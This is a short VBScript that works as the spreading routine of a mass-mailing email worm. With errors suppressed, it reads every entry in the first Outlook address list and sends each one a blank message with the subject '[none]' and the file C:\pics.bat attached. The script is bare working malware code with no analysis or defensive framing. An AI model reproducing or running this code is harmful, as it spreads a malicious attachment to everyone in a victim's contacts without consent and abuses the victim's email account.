Dim x  
ON ERROR RESUME NEXT  
Set fso="Scripting.FileSystemObject" 
Set so=CreateObject(fso)  
Set ol=CreateObject("Outlook.Application")  
Set out= WScript.CreateObject("Outlook.Application")  
Set mapi = out.GetNameSpace("MAPI")  
Set a = mapi.AddressLists(1)  
For x=1 To a.AddressEntries.Count  
Set Mail=ol.CreateItem(0)  
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)  
Mail.Subject="[none]"  
Mail.Body=""  
Mail.Attachments.Add("C:\pics.bat")  
Mail.Send  
Next  
ol.Quit  
